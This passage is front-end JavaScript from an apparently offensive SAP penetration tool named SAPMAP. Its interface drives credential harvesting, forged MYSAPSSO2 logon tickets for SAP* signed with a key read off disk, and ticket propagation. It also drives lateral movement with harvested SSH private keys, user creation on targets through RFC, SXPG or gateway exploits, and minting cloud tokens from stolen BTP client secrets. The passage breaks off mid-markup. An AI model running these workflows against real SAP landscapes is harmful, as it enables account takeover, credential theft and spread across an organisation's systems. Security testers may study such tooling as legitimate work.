  if (!n) return;

  // Build info text with existing credentials and created users
  let infoHtml = `<strong>${escHtml(n.sid)}</strong> (${escHtml(n.hostname || n.ip)})`;
  const creds = n.credentials || [];
  const users = n.created_users || [];
  if (creds.length > 0 || users.length > 0) {
    infoHtml += '<div style="margin-top:6px;font-size:11px;color:#8b949e">';
    if (creds.length > 0) {
      infoHtml += '<div style="margin-bottom:2px">Saved credentials:</div>';
      for (const c of creds) {
        const verified = c.verified ? ' &#9989;' : ' &#10060;';
        infoHtml += `<div style="margin-left:8px;color:#c9d1d9">${escHtml(c.username)} / client ${escHtml(c.client)} / inst ${escHtml(c.instance_nr)}${verified}</div>`;
      }
    }
    if (users.length > 0) {
      infoHtml += '<div style="margin-top:4px;margin-bottom:2px">Created users:</div>';
      for (const u of users) {
        infoHtml += `<div style="margin-left:8px;color:#3fb950">${escHtml(u.username)} / client ${escHtml(u.client)} &#9889;</div>`;
      }
    }
    infoHtml += '</div>';
  }
  document.getElementById('cred-system-info').innerHTML = infoHtml;

  // Find real instance numbers (exclude XX)
  const instNrs = (n.instances || [])
    .map(i => i.instance_nr)
    .filter(nr => nr && nr !== 'XX')
    .sort();
  const inp = document.getElementById('cred-instance');
  inp.value = instNrs[0] || '00';
  document.getElementById('cred-instance-hint').textContent =
    instNrs.length > 1 ? 'Available: ' + instNrs.join(', ') : '';
  document.getElementById('cred-client').value = (n.clients && n.clients[0]) ?
    (n.clients[0].nr || '100') : '100';
  document.getElementById('cred-user').value = '';
  document.getElementById('cred-pass').value = '';
  document.getElementById('cred-modal').classList.add('visible');
}

async function testCredentials() {
  const creds = {
    instance_nr: document.getElementById('cred-instance').value,
    client: document.getElementById('cred-client').value,
    username: document.getElementById('cred-user').value,
    password: document.getElementById('cred-pass').value,
  };
  const res = await api('POST', `node/${selectedNodeSid}/credentials`, { ...creds, test_only: true });
  alert(res.success ? 'Connection successful!' : 'Connection failed: ' + (res.message || 'Unknown error'));
}

function showRemoveCredsModal(sid) {
  selectedNodeSid = sid;
  const n = (mapState.nodes || {})[sid];
  const creds = (n && n.credentials) || [];
  let existing = document.getElementById('remove-creds-overlay');
  if (existing) existing.remove();
  const div = document.createElement('div');
  div.id = 'remove-creds-overlay';
  div.style = 'position:fixed;top:15%;left:25%;right:25%;max-height:70%;'
    + 'background:#0d1117;border:2px solid #f85149;border-radius:6px;'
    + 'z-index:10000;padding:14px 18px;overflow:auto;'
    + 'box-shadow:0 12px 40px rgba(0,0,0,0.7);font-family:sans-serif;'
    + 'color:#e6edf3;font-size:12px';
  if (!creds.length) {
    div.innerHTML = `
      <h3 style="color:#f85149;margin-top:0">&#128465;&#65039; Remove Credentials — ${escHtml(sid)}</h3>
      <div style="color:#8b949e;margin:12px 0">No stored credentials on this node.</div>
      <div style="text-align:right">
        <button class="btn" onclick="this.closest('#remove-creds-overlay').remove()">Close</button>
      </div>`;
    document.body.appendChild(div);
    return;
  }
  const rows = creds.map((c, i) => {
    const verified = c.verified ? '<span style="color:#3fb950">&#10003; verified</span>'
                                 : '<span style="color:#8b949e">untested</span>';
    const src = c.source ? `<span style="color:#8b949e;font-size:10px"> (${escHtml(c.source)})</span>` : '';
    return `<tr style="border-bottom:1px solid #21262d">
      <td style="padding:6px 8px;font-family:monospace">${escHtml(c.username || '')}</td>
      <td style="padding:6px 8px;font-family:monospace">${escHtml(c.client || '')}</td>
      <td style="padding:6px 8px;font-family:monospace">${escHtml(c.instance_nr || '')}</td>
      <td style="padding:6px 8px;font-size:11px">${verified}${src}</td>
      <td style="padding:6px 8px;text-align:right">
        <button class="btn" style="background:#8b1c1c;color:#fff;padding:2px 10px"
          onclick="removeOneCredential('${escHtml(sid)}','${escHtml(c.username || '')}','${escHtml(c.client || '')}','${escHtml(c.instance_nr || '')}')">Delete</button>
      </td>
    </tr>`;
  }).join('');
  div.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
      <h3 style="color:#f85149;margin:0">&#128465;&#65039; Remove Credentials — ${escHtml(sid)}</h3>
      <button class="btn" onclick="this.closest('#remove-creds-overlay').remove()">Close</button>
    </div>
    <div style="color:#8b949e;font-size:11px;margin-bottom:10px">
      Deletes only from SAPMAP's stored-credentials list.  Does NOT
      delete the account on the target system (use <b>Cleanup Users</b>
      for that — only affects SAPMAP-created accounts).
    </div>
    <table style="border-collapse:collapse;width:100%;font-size:12px">
      <thead>
        <tr style="border-bottom:1px solid #30363d;color:#f85149;text-align:left">
          <th style="padding:6px 8px">User</th>
          <th style="padding:6px 8px">Client</th>
          <th style="padding:6px 8px">Inst</th>
          <th style="padding:6px 8px">Status</th>
          <th style="padding:6px 8px;text-align:right">Action</th>
        </tr>
      </thead>
      <tbody>${rows}</tbody>
    </table>`;
  document.body.appendChild(div);
}

async function removeOneCredential(sid, username, client, instance) {
  if (!confirm(`Remove credential "${username}" (client ${client}, inst ${instance}) from ${sid}?\n\n` +
                `This only removes SAPMAP's stored copy — the account on the target system is untouched.`))
    return;
  const r = await api('POST', `node/${sid}/credentials/remove`, {
    username, client, instance_nr: instance });
  if (r && r.error) { alert(`Remove failed: ${r.error}`); return; }
  flashActivity(`${sid}: removed credential ${username}`, 3000);
  // Re-render the picker (or close if now empty)
  startPolling();
  setTimeout(() => showRemoveCredsModal(sid), 400);
}

async function saveCredentials() {
  const creds = {
    instance_nr: document.getElementById('cred-instance').value,
    client: document.getElementById('cred-client').value,
    username: document.getElementById('cred-user').value,
    password: document.getElementById('cred-pass').value,
  };
  await api('POST', `node/${selectedNodeSid}/credentials`, creds);
  closeModal('cred-modal');
  startPolling();
  await pollUpdates();  // refresh state immediately
}

async function downloadTable() {
  const fields = document.getElementById('tbl-fields').value;
  await api('POST', `node/${selectedNodeSid}/download_table`, {
    table: document.getElementById('tbl-name').value,
    fields: fields ? fields.split(',').map(f => f.trim()) : [],
    where: document.getElementById('tbl-where').value,
    max_rows: parseInt(document.getElementById('tbl-maxrows').value) || 500,
  });
  closeModal('table-modal');
}

function showTypeModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('type-system-info').textContent = sid + (n ? ' (' + (n.system_type || 'unknown') + ')' : '');
  const sel = document.getElementById('type-select');
  sel.selectedIndex = 0; // reset to placeholder
  if (n && n.system_type) {
    for (let i = 0; i < sel.options.length; i++) {
      if (sel.options[i].value.toUpperCase() === n.system_type.toUpperCase()) {
        sel.selectedIndex = i; break;
      }
    }
  }
  document.getElementById('type-modal').classList.add('visible');
}
async function saveSystemType() {
  const newType = document.getElementById('type-select').value;
  await api('POST', `node/${selectedNodeSid}/set_type`, { system_type: newType });
  closeModal('type-modal');
  startPolling();
}
function showDbTypeModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('db-type-system-info').textContent = sid + (n ? ' (DB: ' + (n.db_type || 'unknown') + ')' : '');
  const sel = document.getElementById('db-type-select');
  sel.selectedIndex = 0;
  if (n && n.db_type) {
    for (let i = 0; i < sel.options.length; i++) {
      if (sel.options[i].value.toUpperCase() === n.db_type.toUpperCase()) {
        sel.selectedIndex = i; break;
      }
    }
  }
  document.getElementById('db-type-modal').classList.add('visible');
}
async function saveDbType() {
  const newDb = document.getElementById('db-type-select').value;
  await api('POST', `node/${selectedNodeSid}/set_db_type`, { db_type: newDb });
  closeModal('db-type-modal');
  startPolling();
}
function showOsTypeModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('os-type-system-info').textContent = sid + (n ? ' (OS: ' + (n.os_type || 'unknown') + ')' : '');
  const sel = document.getElementById('os-type-select');
  sel.selectedIndex = 0;
  if (n && n.os_type) {
    for (let i = 0; i < sel.options.length; i++) {
      if (sel.options[i].value.toLowerCase() === n.os_type.toLowerCase()) {
        sel.selectedIndex = i; break;
      }
    }
  }
  document.getElementById('os-type-modal').classList.add('visible');
}
async function saveOsType() {
  const newOs = document.getElementById('os-type-select').value;
  await api('POST', `node/${selectedNodeSid}/set_os_type`, { os_type: newOs });
  closeModal('os-type-modal');
  startPolling();
}
function showSidModal(sid) {
  document.getElementById('sid-system-info').textContent =
    'Current: ' + sid;
  document.getElementById('sid-input').value = sid;
  document.getElementById('sid-modal').classList.add('visible');
  const input = document.getElementById('sid-input');
  input.focus();
  input.select();
}
async function saveSid() {
  const oldSid = selectedNodeSid;
  if (!oldSid) return;
  const raw = (document.getElementById('sid-input').value || '').trim().toUpperCase();
  if (!/^[A-Z0-9]{3}$/.test(raw)) {
    alert('SID must be exactly three alphanumeric characters (uppercase), e.g. PRD.');
    return;
  }
  if (raw === oldSid) { closeModal('sid-modal'); return; }
  if ((mapState.nodes || {})[raw]) {
    alert('A system with SID ' + raw + ' already exists on the map. Choose a different SID or delete the existing one first.');
    return;
  }
  const r = await api('POST', `node/${oldSid}/set_sid`, { new_sid: raw });
  if (r && r.error) { alert('Set SID failed: ' + r.error); return; }
  selectedNodeSid = raw;
  closeModal('sid-modal');
  startPolling();
}

function showInstanceNrModal(sid) {
  const n = (mapState.nodes || {})[sid];
  const cur = (n && n.instances && n.instances.length) ? n.instances[0].instance_nr : '';
  document.getElementById('instance-nr-system-info').textContent =
    sid + (cur ? ' (current: ' + cur + ')' : ' (no instance set)');
  document.getElementById('instance-nr-input').value = cur || '';
  document.getElementById('instance-nr-modal').classList.add('visible');
  document.getElementById('instance-nr-input').focus();
  document.getElementById('instance-nr-input').select();
}
async function saveInstanceNr() {
  const raw = (document.getElementById('instance-nr-input').value || '').trim();
  if (!/^\d{2}$/.test(raw)) {
    alert('Instance number must be exactly two digits, e.g. 00 or 01.');
    return;
  }
  const r = await api('POST', `node/${selectedNodeSid}/set_instance_nr`,
                      { instance_nr: raw });
  if (r && r.error) { alert('Set failed: ' + r.error); return; }
  closeModal('instance-nr-modal');
  startPolling();
}

function showSaprouterModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('saprouter-system-info').textContent =
    sid + (n && n.saprouter ? ' (current: ' + n.saprouter + ')' : ' (no SAProuter set)');
  document.getElementById('saprouter-input').value = (n && n.saprouter) || '';
  document.getElementById('saprouter-modal').classList.add('visible');
  document.getElementById('saprouter-input').focus();
}

// =====================================================================
//  MYSAPSSO2 ticket-forgery workflow — UI handlers
// =====================================================================
//
// Three operator actions, each anchored to a node in the map:
//
//   1. showForgeTicketModal(sid)     — opens the forge modal, then
//      POSTs to /api/node/<sid>/forge_ticket on Submit.  The forge
//      runs as a background job; the new ticket appears on
//      node.forged_tickets via the regular state poll.  The SSO2
//      profile pre-flight check runs implicitly inside the forge
//      orchestrator (step 2.5) — no separate handler / modal.
//
//   2. showPropagateTicketModal(sid) — opens the propagate modal,
//      pre-populates the ticket selector from node.forged_tickets,
//      then POSTs to /api/node/<sid>/propagate_ticket on Submit.
//
// Both are gated on a node existing in mapState; the forge modal
// also needs the node to have OS access (sapxpg/10KBLAZE) because
// the chain reads SAPSYS.pse from disk.
// ---------------------------------------------------------------------

function showForgeTicketModal(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;

  // Header line — show what we know about the system + any tickets
  // already forged for it, so the operator can avoid duplicates.
  let info = `<strong>${escHtml(n.sid)}</strong> `
           + `(${escHtml(n.hostname || n.ip)})`;
  const tickets = n.forged_tickets || [];
  if (tickets.length > 0) {
    info += `<div style="margin-top:6px;font-size:11px;color:#8b949e">`
          + `Existing forged tickets on this node: ${tickets.length}`
          + `</div>`;
  }
  document.getElementById('forge-ticket-system-info').innerHTML = info;

  // Sensible defaults that match the operator-guide examples
  const firstClient = (n.clients && n.clients[0] && n.clients[0].nr)
                       || '100';
  document.getElementById('forge-ticket-user').value = 'SAP*';
  document.getElementById('forge-ticket-client').value = firstClient;
  document.getElementById('forge-ticket-validity').value = 480;
  document.getElementById('forge-ticket-digest').value = 'sha256';
  document.getElementById('forge-ticket-pin').value = '';
  document.getElementById('forge-ticket-recipient-sid').value = '';
  document.getElementById('forge-ticket-recipient-client').value = '';

  document.getElementById('forge-ticket-modal').classList.add('visible');
}

async function submitForgeTicket() {
  const sid = selectedNodeSid;
  if (!sid) return;

  const body = {
    user: document.getElementById('forge-ticket-user').value || 'SAP*',
    client: document.getElementById('forge-ticket-client').value || '100',
    validity_min: parseInt(
      document.getElementById('forge-ticket-validity').value) || 480,
    digest: document.getElementById('forge-ticket-digest').value || 'sha256',
  };
  // Only send advanced fields when populated, so the backend uses
  // its own defaults / candidate-walk where appropriate.
  const pin = document.getElementById('forge-ticket-pin').value;
  if (pin) body.pin = pin;
  const rsid = document.getElementById('forge-ticket-recipient-sid').value;
  if (rsid) body.recipient_sid = rsid;
  const rcli = document.getElementById('forge-ticket-recipient-client').value;
  if (rcli) body.recipient_client = rcli;

  closeModal('forge-ticket-modal');
  showToast(
    `&#127915; Forging MYSAPSSO2 ticket for ${escHtml(body.user)}`
    + `@${escHtml(sid)}/${escHtml(body.client)} — see console for `
    + `per-step progress; ticket will appear on the node when done.`,
    'info'
  );
  await api('POST', `node/${sid}/forge_ticket`, body);
  // Bring polling back to life so the new ticket shows up promptly
  // in the node details / sidebar.
  startPolling();
}

// The SSO2 profile pre-flight check used to be exposed as a
// standalone menu action ("Check SSO2 Profile") with its own
// modal, polling loop, and renderer.  Operator feedback removed
// it: the same check runs implicitly as step 2.5 of the forge
// orchestrator (extract_and_forge_ticket in sapmap_exploit.py),
// so the standalone surface was duplicative.  Operators who want
// to run the check in isolation can use the CLI tool
// (``python3 tools/check_sso2_profile.py``).

function showPropagateTicketModal(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;

  const tickets = n.forged_tickets || [];
  if (tickets.length === 0) {
    showToast(
      `${escHtml(sid)} has no forged tickets yet — forge one `
      + `first via the &#127915; Forge MYSAPSSO2 Ticket action.`,
      'warn'
    );
    return;
  }

  // Header line + summary
  document.getElementById('propagate-ticket-system-info').innerHTML =
    `<strong>${escHtml(n.sid)}</strong> `
    + `(${escHtml(n.hostname || n.ip)}) — `
    + `${tickets.length} ticket(s) on disk`;

  // Populate the ticket selector with one option per forged ticket.
  // Label format: "0: JORIS@S4H/001 — 23m left, signer CN=S4H"
  const sel = document.getElementById('propagate-ticket-select');
  sel.innerHTML = '';
  tickets.forEach((t, idx) => {
    const remaining = (t.remaining_minutes !== undefined
                        && t.remaining_minutes !== null)
                      ? Math.round(t.remaining_minutes) + 'm left'
                      : 'unknown TTL';
    const signer = t.signer_dn || '?';
    const label = `${idx}: ${t.user || '?'}@${t.sid || '?'}/`
                + `${t.client || '?'} — ${remaining}, `
                + `signer ${signer}`;
    const opt = document.createElement('option');
    opt.value = String(idx);
    opt.textContent = label;
    sel.appendChild(opt);
  });

  // Default target SIDs: the issuer itself (self-trust) — operator
  // can extend with comma-separated SIDs of receivers they know
  // have us in their TWPSSO2ACL.
  document.getElementById('propagate-ticket-targets').value = sid;
  document.getElementById('propagate-ticket-http').checked = true;
  document.getElementById('propagate-ticket-rfc').checked = true;
  document.getElementById('propagate-ticket-timeout').value = 10;

  document.getElementById('propagate-ticket-modal').classList.add('visible');
}

async function submitPropagateTicket() {
  const sid = selectedNodeSid;
  if (!sid) return;

  const targets = document.getElementById('propagate-ticket-targets')
                    .value.split(',').map(s => s.trim()).filter(Boolean);
  const channels = [];
  if (document.getElementById('propagate-ticket-http').checked)
    channels.push('http');
  if (document.getElementById('propagate-ticket-rfc').checked)
    channels.push('rfc');
  if (channels.length === 0) {
    showToast('Pick at least one channel (HTTP or RFC)', 'warn');
    return;
  }

  const body = {
    ticket_index: parseInt(
      document.getElementById('propagate-ticket-select').value) || 0,
    target_sids: targets,
    channels: channels,
    timeout: parseInt(
      document.getElementById('propagate-ticket-timeout').value) || 10,
  };

  closeModal('propagate-ticket-modal');
  showToast(
    `&#128640; Propagating ticket #${body.ticket_index} to `
    + `${escHtml(targets.join(', '))} via ${channels.join('+')} `
    + `— see console for per-receiver verdicts.`,
    'info'
  );
  await api('POST', `node/${sid}/propagate_ticket`, body);
  startPolling();
}

// ── SSH Lateral Movement key-selection modal ──────────────────────
async function showSshLateralModal(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;

  document.getElementById('ssh-lateral-system-info').innerHTML =
    '<strong>' + escHtml(n.sid) + '</strong> '
    + '(' + escHtml(n.hostname || n.ip || '') + ')';

  const listEl = document.getElementById('ssh-lateral-keys-list');
  listEl.innerHTML = '<div style="color:#8b949e;font-size:11px">Loading harvested keys…</div>';
  document.getElementById('ssh-lateral-go-btn').disabled = true;
  document.getElementById('ssh-lateral-modal').classList.add('visible');

  let data;
  try {
    data = await api('GET', 'node/' + sid + '/ssh_loot_keys');
  } catch (e) {
    listEl.innerHTML = '<div style="color:#f85149">Failed to fetch SSH loot data.</div>';
    return;
  }

  const keys = (data && data.keys) || [];
  const authKeys = (data && data.authorized_keys) || [];

  if (keys.length === 0) {
    let msg = '<div style="color:#f0883e;font-size:12px;line-height:1.6">'
      + '&#9888; No harvested SSH private keys found for this node.<br>'
      + 'Run <strong>SSH Key Harvest</strong> (or <strong>SSH Key Harvest as Root</strong>) first.';
    if (authKeys.length > 0)
      msg += '<br><br><span style="color:#8b949e">Note: ' + authKeys.length
        + ' authorized_keys entries were found, but no private keys to test with.</span>';
    msg += '</div>';
    listEl.innerHTML = msg;
    return;
  }

  document.getElementById('ssh-lateral-go-btn').disabled = false;
  document.getElementById('ssh-lateral-modal')._osUsers = data.os_users || [];

  let html = '<div style="margin-bottom:8px;font-size:11px;color:#8b949e">'
    + keys.length + ' private key(s) found</div>';
  keys.forEach(function(k, idx) {
    const id = 'ssh-key-cb-' + idx;
    html += '<label style="display:flex;align-items:center;gap:8px;padding:5px 8px;'
      + 'border:1px solid #30363d;border-radius:4px;margin-bottom:4px;'
      + 'background:#0d1117;cursor:pointer;font-size:12px;color:#c9d1d9">'
      + '<input type="checkbox" id="' + id + '" checked '
      + 'data-key-owner="' + escHtml(k.owner) + '" '
      + 'data-key-path="' + escHtml(k.path) + '" '
      + 'data-key-type="' + escHtml(k.type) + '" '
      + 'style="accent-color:#3fb950;width:16px;height:16px;flex-shrink:0">'
      + '<span><strong>' + escHtml(k.owner) + '</strong>'
      + '<span style="color:#8b949e;margin-left:8px">' + escHtml(k.type) + '</span>'
      + ' <span style="color:#484f58;font-size:10px">(' + (k.size||'?') + ' B)</span>'
      + '<br><span style="font-size:10px;color:#484f58">' + escHtml(k.path) + '</span>'
      + '</span></label>';
  });
  listEl.innerHTML = html;
}

async function submitSshLateral() {
  const sid = selectedNodeSid;
  if (!sid) return;

  const keys = [];
  document.querySelectorAll('#ssh-lateral-keys-list input[type=checkbox]:checked').forEach(function(cb) {
    keys.push({
      owner: cb.dataset.keyOwner,
      path:  cb.dataset.keyPath,
      type:  cb.dataset.keyType,
    });
  });

  if (keys.length === 0) {
    showToast('Select at least one SSH key to test.', 'warn');
    return;
  }

  const osUsers = document.getElementById('ssh-lateral-modal')._osUsers || [];

  closeModal('ssh-lateral-modal');
  showToast(
    '&#128640; Testing ' + keys.length + ' SSH key(s) from ' + escHtml(sid)
    + ' against all map nodes — see console for per-target verdicts.',
    'info'
  );
  await api('POST', 'node/' + sid + '/ssh_test_keys', {
    keys: keys,
    os_users: osUsers,
  });
  startPolling();
}

function showRouterScanModal(sid) {
  const n = (mapState.nodes || {})[sid];
  const ri = (n && n.saprouter_info) || {};
  const routerIp = (n && n.ip) || sid;

  // Info line
  let infoText = sid + ' (' + routerIp + ')';
  if (n && n.saprouter) infoText += '  •  routing via: ' + n.saprouter;
  document.getElementById('router-scan-info').textContent = infoText;

  // Auto-targets from router info
  const autoRow = document.getElementById('router-scan-autotargets-row');
  const autoCount = document.getElementById('router-scan-auto-count');
  if (ri.vulnerable && ((ri.clients && ri.clients.length) || (ri.raw_info && ri.raw_info.length))) {
    autoRow.style.display = '';
    const cnt = (ri.clients || []).length;
    autoCount.textContent = cnt ? '(' + cnt + ' client IP(s) available)' : '';
  } else {
    autoRow.style.display = 'none';
  }

  // Clear manual target field
  document.getElementById('router-scan-targets').value = '';

  document.getElementById('router-scan-modal').classList.add('visible');
  document.getElementById('router-scan-targets').focus();
}

async function startRouterScan() {
  const sid = selectedNodeSid;
  const targets  = document.getElementById('router-scan-targets').value.trim();
  const auto     = document.getElementById('router-scan-auto').checked;
  const instFrom = parseInt(document.getElementById('router-scan-inst-from').value) || 0;
  const instTo   = parseInt(document.getElementById('router-scan-inst-to').value) || 10;
  const mode     = document.getElementById('router-scan-mode').value;
  const conc     = parseInt(document.getElementById('router-scan-concurrency').value) || 10;
  const tout     = parseFloat(document.getElementById('router-scan-timeout').value) || 5;

  if (!targets && !auto) {
    alert('Please enter a target range or enable auto-fill from router info.');
    return;
  }

  closeModal('router-scan-modal');
  const r = await api('POST', `node/${sid}/router_scan`, {
    targets:      targets,
    auto_targets: auto,
    inst_from:    instFrom,
    inst_to:      instTo,
    mode:         mode,
    concurrency:  conc,
    timeout:      tout,
  });
  if (r && r.error) {
    alert('Router scan failed to start: ' + r.error);
  } else if (r && r.status === 'started') {
    console.log('Router scan started:', r);
  }
  startPolling();
}
async function saveSaprouter() {
  const val = document.getElementById('saprouter-input').value.trim();
  await api('POST', `node/${selectedNodeSid}/set_saprouter`, { saprouter: val });
  closeModal('saprouter-modal');
  startPolling();
}

function closeModal(id) { document.getElementById(id).classList.remove('visible'); }
function openLegend() {
  // Show the full map-legend modal.  Closes on backdrop click,
  // ESC key, or the Close button — same UX as every other modal.
  document.getElementById('legend-modal').classList.add('visible');
}
// ESC closes the legend modal (matches the credential/BTP-token modals).
document.addEventListener('keydown', function(ev) {
  if (ev.key === 'Escape') {
    const lm = document.getElementById('legend-modal');
    if (lm && lm.classList.contains('visible')) {
      lm.classList.remove('visible');
    }
  }
});

async function showSetPasswordModal() {
  const res = await api('GET', 'settings/password');
  document.getElementById('pwd-current').value = res.password || '?';
  document.getElementById('pwd-new').value = '';
  document.getElementById('password-modal').classList.add('visible');
  document.getElementById('pwd-new').focus();
}
async function setDefaultPassword() {
  const newPwd = document.getElementById('pwd-new').value;
  if (!newPwd) { alert('Password cannot be empty'); return; }
  const res = await api('POST', 'settings/password', { password: newPwd });
  if (res.error) { alert(res.error); return; }
  closeModal('password-modal');
}

function showAddSystemModal() {
  document.getElementById('add-sid').value = '';
  document.getElementById('add-ip').value = '';
  document.getElementById('add-instance').value = '00';
  document.getElementById('add-saprouter').value = '';
  document.getElementById('add-system-modal').classList.add('visible');
  document.getElementById('add-sid').focus();
}
async function addSystem() {
  const sid = document.getElementById('add-sid').value.trim().toUpperCase();
  const ip = document.getElementById('add-ip').value.trim();
  const inst = document.getElementById('add-instance').value.trim();
  const saprouter = document.getElementById('add-saprouter').value.trim();
  if (!sid || !ip || !inst) { alert('SID, IP, and Instance are required'); return; }
  const res = await api('POST', 'node/add', { sid, ip, instance_nr: inst, saprouter });
  if (res.error) { alert(res.error); return; }
  closeModal('add-system-modal');
  startPolling();
}

function showTcpipModal(sid) {
  document.getElementById('tcpip-source-info').textContent = `Source: ${sid}`;
  const sel = document.getElementById('tcpip-target');
  sel.innerHTML = '';
  const nodes = mapState.nodes || {};
  for (const s in nodes) {
    if (s === sid) continue;
    const n = nodes[s];
    const label = `${s} (${n.ip || n.hostname || '?'})`;
    sel.innerHTML += `<option value="${s}">${label}</option>`;
  }
  if (sel.options.length === 0) {
    alert('No other systems on the map to create a destination to.');
    return;
  }
  document.getElementById('tcpip-modal').classList.add('visible');
}
async function createTcpipDest() {
  const targetSid = document.getElementById('tcpip-target').value;
  if (!targetSid) { alert('Select a target system'); return; }
  closeModal('tcpip-modal');
  await api('POST', `node/${selectedNodeSid}/create_tcpip_dest`, { target_sid: targetSid });
  startPolling();
}

function showPropagateModal(sid) {
  document.getElementById('propagate-source-info').textContent = `Source: ${sid}`;
  const sel = document.getElementById('propagate-target');
  sel.innerHTML = '';
  const nodes = mapState.nodes || {};
  const conns = mapState.connections || [];

  // Build list of reachable targets from this source
  const targets = {};
  for (const c of conns) {
    if (c.source_sid !== sid) continue;
    if (!c.target_sid || c.target_sid === sid) continue;
    const tgt = nodes[c.target_sid];
    if (!tgt) continue;
    if (tgt.pwned) continue;  // already pwned
    const key = c.target_sid;
    if (!targets[key]) targets[key] = { sid: key, methods: [] };
    if (c.sapxpg_remote_works) {
      targets[key].methods.push(`TCP/IP: ${c.destination_name}`);
    } else if (c.logon_successful && c.has_sap_all) {
      targets[key].methods.push(`RFC+SAP_ALL: ${c.destination_name}`);
    } else if (c.logon_successful) {
      targets[key].methods.push(`RFC Logon OK: ${c.destination_name}`);
    } else if (c.secstore_password) {
      // Java-sourced HTTP destination with decrypted SecStore creds —
      // backend fast path can log on to the target directly.
      targets[key].methods.push(`SecStore creds: ${c.destination_name}`);
    }
  }
  // Also add GW-vulnerable targets that are on the map
  for (const s in nodes) {
    if (s === sid) continue;
    const n = nodes[s];
    if (n.pwned) continue;
    if (n.gw_vulnerable && !targets[s]) {
      targets[s] = { sid: s, methods: ['GW Vulnerable'] };
    } else if (n.gw_vulnerable && targets[s]) {
      targets[s].methods.push('GW Vulnerable');
    }
  }

  if (Object.keys(targets).length === 0) {
    alert('No exploitable targets found.\n\nNeed: RFC Type 3 with SAP_ALL, TCP/IP with ping OK, or vulnerable gateway on a target system.');
    return;
  }

  for (const key in targets) {
    const t = targets[key];
    const n = nodes[t.sid];
    const host = n ? (n.ip || n.hostname || '?') : '?';
    const methods = t.methods.length ? ` [${t.methods.join(', ')}]` : '';
    sel.innerHTML += `<option value="${t.sid}">${t.sid} (${host})${methods}</option>`;
  }
  document.getElementById('propagate-hint').textContent =
    'Select a target system to create a SAPMAP user on. ' +
    'Tries BAPI first, then SXPG over TCP/IP, then GW exploit.';
  document.getElementById('propagate-modal').classList.add('visible');
}
async function doPropagateTarget() {
  const targetSid = document.getElementById('propagate-target').value;
  if (!targetSid) { alert('Select a target system'); return; }
  closeModal('propagate-modal');
  await api('POST', `node/${selectedNodeSid}/propagate`, { target_sid: targetSid });
  startPolling();
}

// On-prem → BTP lateral move: show captured BTP-bound credentials
// (SM59 destinations to *.hana.ondemand.com, RSECTAB / Java SecStore
// rows) and let the operator pick one to exchange at XSUAA for a
// BTP access token.  After a successful mint the existing BTP
// pull-destinations flow runs automatically.
async function showHarvestBtpCredsModal(sid) {
  const r = await api('POST', `node/${sid}/harvest_btp_creds`);
  const cands = (r && r.candidates) || [];
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };

  const rows = cands.map((c, i) => `
    <tr style="border-top:1px solid #30363d">
      <td style="padding:6px 8px;font-size:11px;color:#8b949e">${escHtml(c.source)}</td>
      <td style="padding:6px 8px;font-size:11px;font-family:monospace;word-break:break-all">${escHtml(c.label)}</td>
      <td style="padding:6px 8px"><input id="btph-uaa-${i}" value="${escHtml(c.uaa_url)}" style="width:100%;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
      <td style="padding:6px 8px"><input id="btph-cid-${i}" value="${escHtml(c.client_id)}" style="width:160px;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
      <td style="padding:6px 8px"><input id="btph-cs-${i}" value="${escHtml(c.client_secret)}" type="password" style="width:160px;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
      <td style="padding:6px 8px"><button class="btn" onclick="doMintBtpToken('${escHtml(sid)}', ${i})" style="background:#1f6feb;color:#fff;border:0;padding:4px 10px;border-radius:4px;cursor:pointer">Mint</button></td>
    </tr>`).join('');

  overlay.innerHTML = `
    <div class="modal" style="max-width:1100px;width:96%;max-height:90vh;overflow-y:auto;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;color:#c9d1d9">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
        <h3 style="margin:0;color:#f0883e">&#9729; Harvest BTP Credentials — ${escHtml(sid)}</h3>
        <button onclick="this.closest('.modal-overlay').remove()" style="background:transparent;border:0;color:#c9d1d9;font-size:22px;cursor:pointer">&times;</button>
      </div>
      <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.45">
        Refreshes <code>OA2C_CLIENT</code> + <code>OA2C_CLIENT_EXT</code> (transaction <b>OA2C_CONFIG</b>) and scans this node's already-captured artefacts
        (SM59 destinations to <code>*.hana.ondemand.com</code>, ABAP RSECTAB, Java SecStoreFS) for BTP-shaped <code>(client_id, client_secret)</code> pairs.
        Click <b>Mint</b> on a row to exchange at the destination's XSUAA <code>/oauth/token</code> endpoint with <code>grant_type=client_credentials</code>
        and store the resulting BTP token; the cloud topology is then enumerated automatically.
      </div>
      ${cands.length === 0 ? `
        <div style="padding:14px;background:#0d1117;border:1px dashed #30363d;border-radius:6px;text-align:center;color:#8b949e;font-size:12px">
          No BTP-bound credentials found in <b>${escHtml(sid)}</b>'s captures yet.<br>
          Try running <b>Retrieve RFC Connections</b> + <b>Download SecStore</b> first; outbound destinations to
          <code>*.authentication.*.hana.ondemand.com</code> with cleartext-recovered passwords will appear here.<br><br>
          Or paste credentials manually:
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:6px;margin-top:10px;align-items:center">
          <input id="btph-uaa-manual" placeholder="https://&lt;subdomain&gt;.authentication.&lt;region&gt;.hana.ondemand.com/oauth/token" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
